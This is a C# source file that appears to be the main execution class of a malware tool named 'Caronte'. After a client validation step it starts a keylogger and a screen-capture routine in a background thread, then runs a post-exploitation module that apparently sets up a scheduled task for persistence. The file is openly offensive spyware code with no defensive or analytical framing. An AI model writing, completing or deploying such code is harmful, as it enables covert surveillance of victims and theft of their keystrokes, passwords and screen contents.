using Caronte.Modules.Information;
using Caronte.Modules.PostExploitation;
using Caronte.Utils.Client;
using MediatR;
using System.Threading;
using System.Threading.Tasks;

namespace Caronte
{
    public class Execution
    {
        private readonly IMediator _mediator;
        private readonly CancellationToken _cancellationToken;
        private readonly ClientValidation _clientValidation;

        public Execution(IMediator mediator, CancellationToken cancellationToken)
        {
            _mediator = mediator;
            _cancellationToken = cancellationToken;
            _clientValidation = new ClientValidation(_mediator);
        }

        public async Task Execute()
        {
            await _clientValidation.Validate();
            await RunTasks();
        }

        private async Task RunTasks()
        {
            StartInfiniteTasksThread();
            await RunSingleExecutionTasks();
        }

        private void StartInfiniteTasksThread()
        {
            Task.Run(async () =>
            {
                await StartInformationServices.KeyboardLog(_cancellationToken, _mediator);
                await StartInformationServices.PrintScreen(_cancellationToken, _mediator);
            }, _cancellationToken);
        }

        private async Task RunSingleExecutionTasks()
        {
            await StartPostExploitationService.TaskSchedule(_cancellationToken, _mediator);
        }
    }
}
